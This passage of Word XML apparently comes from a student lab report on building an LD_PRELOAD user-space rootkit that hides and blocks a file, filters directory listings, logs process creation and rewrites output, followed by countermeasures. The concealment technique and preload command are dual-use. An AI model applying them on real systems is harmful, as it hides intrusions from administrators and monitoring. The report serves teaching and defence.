        <w:t>In a dynamically linked program, library calls are resolved through the procedure linkage table and global offset table, which the loader fills at start-up. The loader searches objects named in LD_PRELOAD before the standard libraries, so a shared object listed there can supply its own version of a libc symbol and the program calls it instead. The genuine implementation stays reachable through dlsym(RTLD_NEXT, "name"), and every hook here uses that call to chain to it, so the original behaviour is preserved even when a wrapper blocks or rewrites a request. Fig. 4 summarises this flow.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB0E0ED" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E443295" wp14:editId="49556EBF">
            <wp:extent cx="5760000" cy="2303419"/>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5760000" cy="2303419"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB1E51F" w14:textId="77777777" w:rsidR="00F66EC6" w:rsidRDefault="005F5F09">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 4 - Architecture of the demonstration: the dynamic loader loads rootkit.so ahead of libc, each hook either conceals or blocks the call, or chains through dlsym(RTLD_NEXT) to the real function, and every interception is written to the log; the lower panel traces the target program's file access, listing, fork and exec sequence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AFCE60" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc241601972"/>
      <w:r>
        <w:t>2.2 Components of the hooking library</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="718CF2F1" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t xml:space="preserve">rootkit.c is one shared object that interposes eleven library entry points (Fig. 5). A constructor runs at load time. It writes a banner to stderr and a log entry, which makes every process that loads the library visible. The logging routine appends a timestamped, PID-tagged line to /tmp/rootkit.log. The </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>file-access group wraps open and openat and blocks any path containing secret.txt by returning -1 with errno set to ENOENT; read is logged and passed through. The metadata group applies the same policy to stat, lstat, statx and access. That defeats tools which inspect a path without opening it. readdir removes the protected name from listings, and the process group records fork and execve with the parent and child identifiers. The printf wrapper rewrites one message, showing that output can be altered rather than only logged. A thread-local guard stops re-entrancy, because the logging routine itself calls fopen and fprintf.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4750FEFD" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>victim.c is the target application (Fig. 6). It opens /tmp/secret.txt, performs a directory listing through system(), and then forks and executes /bin/uname, which gives the hooks a file access, a directory query and a process-creation event to intercept.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0952F812" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3BB32E0E" wp14:editId="63FA96A4">
            <wp:extent cx="5760000" cy="300455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6.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="3004557"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F037AF1" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 5 - rootkit.c in nano: the hooking library with its logging routine, constructor, file, metadata, process and output hooks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5390566D" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F71FD54" wp14:editId="73103AA2">
            <wp:extent cx="5760000" cy="295824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9.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2958245"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="63507C7F" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 6 - victim.c in nano: the target program that opens the protected file, lists it and forks/execs uname.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C4F95E" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc241601973"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>3. Attack Procedure and Execution Evidence</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="1C9F4DD6" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>The protected file was created and its contents confirmed before any interception was introduced (Fig. 7). The library was then compiled as a shared object with -shared -fPIC and the target program was compiled separately (Fig. 8).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2679D78C" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50A63EC1" wp14:editId="14C24D27">
            <wp:extent cx="5760000" cy="208147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1.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2081472"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4ED04E" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 7 - Target file created: echo writes /tmp/secret.txt (44 bytes) and cat reads it back before the attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099A0DE4" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7D169F3D" wp14:editId="67E7F1B3">
            <wp:extent cx="5760000" cy="236175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2.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2361758"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7613973A" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 8 - Compilation: rootkit.so built with -shared -fPIC -ldl and victim built from victim.c; ls -l lists all four files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689D7D23" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>The baseline run used no interception at all: the file was read normally, the listing showed it, and the child process printed the kernel details (Fig. 9). Running the same binary under LD_PRELOAD=./rootkit.so ./victim changes every one of those observations (Fig. 10): the banner appears for each process that loads the library, the open call fails with "No such file or directory", the listing inside the program reports that the file cannot be accessed, and the child process still executes uname correctly, showing that the interposed fork and execve wrappers chain to the real functions rather than replacing them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD6854C" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48305AAF" wp14:editId="0213D2AE">
            <wp:extent cx="5760000" cy="215885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3.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2158857"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC4AFCB" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 9 - Baseline without interception: cat and the victim program read the file and the listing shows it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3098C9E7" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D860E4A" wp14:editId="2ADF05C0">
            <wp:extent cx="5760000" cy="223692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4.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2236923"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="70865D82" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 10 - Hooked execution: LD_PRELOAD=./rootkit.so ./victim - the open call is blocked with ENOENT, the listing reports the file as not visible, and the child uname still runs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DBE4613" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>Concealment was then verified from three angles (Fig. 11): an explicit ls -l fails, cat fails, and ls on the directory lists no matching entry. Removing LD_PRELOAD restores normal behaviour immediately, confirming that the change is confined to processes started in the modified environment (Fig. 12).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37933EDD" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48EC7190" wp14:editId="31CD80D9">
            <wp:extent cx="5760000" cy="228400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5.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId19"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2284005"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DF76C8" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 11 - Concealment from three interfaces: ls -l and cat fail for the protected path, and the directory listing contains no matching entry. The interception log in Fig. 13 identifies the corresponding statx, open and readdir hooks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65DCAFF8" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="33D4CF03" wp14:editId="06167930">
            <wp:extent cx="5760000" cy="211062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6.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId20"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2110621"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E57AAB6" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 12 - Contrast: with LD_PRELOAD removed the same two commands list and read the file normally.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643CFE5A" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>The log is the evidence behind the screenshots (Fig. 13). Every blocked call is recorded with its arguments and the ENOENT result. The concealed directory entry is there too, and the fork and execve lines trace the process tree. The full sequence was also captured with script(1) into cb012653_partc_demo.log (Fig. 14), submitted with the source files as reproducible evidence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F6B4AA" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2733EAC6" wp14:editId="0DC27A96">
            <wp:extent cx="5760000" cy="259375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7.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2593753"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7D9BCD" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 13 - Interception log: blocked open and statx calls, the concealed readdir entry, monitored fork and execve events, and the intercepted printf call.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76CECA3B" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78E578FF" wp14:editId="165FCACC">
            <wp:extent cx="5760000" cy="2966173"/>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8.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2966173"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76313390" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 14 - Recorded demonstration session (script -a cb012653_partc_demo.log) capturing the baseline, the hooked run and the concealment checks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58941E83" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc241601974"/>
      <w:r>
        <w:t>4. Technical Analysis, Implications and Mitigation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="45636387" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>The attack works entirely in user space. Nothing is inserted into the kernel, no privileged operation is involved beyond setting an environment variable, and no existing binary or kernel structure is altered. The demonstration creates the shared object, the interception log, and the test file used as the protected target. Its reach is limited to dynamically linked programs started in the modified environment, and for this demonstration the relative-path LD_PRELOAD=./rootkit.so technique does not affect set-user-ID or set-group-ID programs, because the loader enters secure-execution mode and restricts how LD_PRELOAD is processed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10EE0704" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>The implications for monitoring and forensics follow directly. Dynamically linked tools launched in the affected environment, resolving the interposed symbols, see the modified view: hidden files stay hidden in listings, protected paths appear not to exist, and output can be rewritten before it reaches a screen or a log. Static binaries and programs that bypass the intercepted interfaces are unaffected. Because the interception happens between the program and the library, kernel-level mechanisms operating outside the affected user-space process are not altered by this hook. However, calls blocked before reaching the kernel do not produce the corresponding kernel operation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="168FD72F" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>Several countermeasures follow. Verify binaries that matter rather than trusting them, using package verification or file integrity monitoring. Monitoring should not run inside the environment it is trying to observe: kernel-side mechanisms such as auditd or eBPF-based tools are unaffected by LD_PRELOAD. Services should start from a controlled environment with LD_PRELOAD and LD_LIBRARY_PATH cleared, loaded objects can be inspected through /proc, and static linking removes the attack surface for individually critical tools. Confinement through SELinux, AppArmor or containers limits what a hooked process can reach, but it does not prevent the interposition itself. Treat it as a supporting control, not a defence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273ED86E" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc241601975"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>5. Conclusion</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w14:paraId="3101A9D6" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>This exercise produced a working user-space rootkit from a single shared object and showed it hiding a file from four interfaces, blocking direct and metadata access, monitoring process creation and execution, and altering printed output, while chaining every interception back to the original function. The result shows how much control the dynamic loader gives to whichever library a program loads, and why environment hygiene, binary verification and kernel-side monitoring are more dependable than trusting the output of tools run on a suspect system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DD4139" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc241601976"/>
      <w:r>
        <w:t>6. Verification Checklist</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3334"/>
        <w:gridCol w:w="3213"/>
        <w:gridCol w:w="3213"/>
      </w:tblGrid>
      <w:tr w:rsidR="009C1980" w14:paraId="3DC294B3" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E1BF04F" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Required Item</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="40DF0747" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4726FCF1" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Evidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="48A125A7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6CCF6720" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>VM identity and pre-work snapshot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6BB41721" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="76E84B64" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Figs. 1-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="33C04930" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="692E47EA" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Toolchain available (gcc 13.3.0)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2F89CA74" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="542893F0" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Fig. 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="511344BA" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="72C47899" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Hooking library implements file, metadata, process, logging and output hooks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="76536E54" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79BC8A51" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Figs. 5-6</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="627BE5A7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6B4084C9" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Library and target program compile cleanly</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2532FE78" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3059075A" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Fig. 8</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009C1980" w14:paraId="1963D3D8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="46262F54" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Baseline behaviour captured without interception</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="41F2866D" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Pass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3213" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="101BE66E" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
            <w:r>
              <w:t>Fig. 9</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
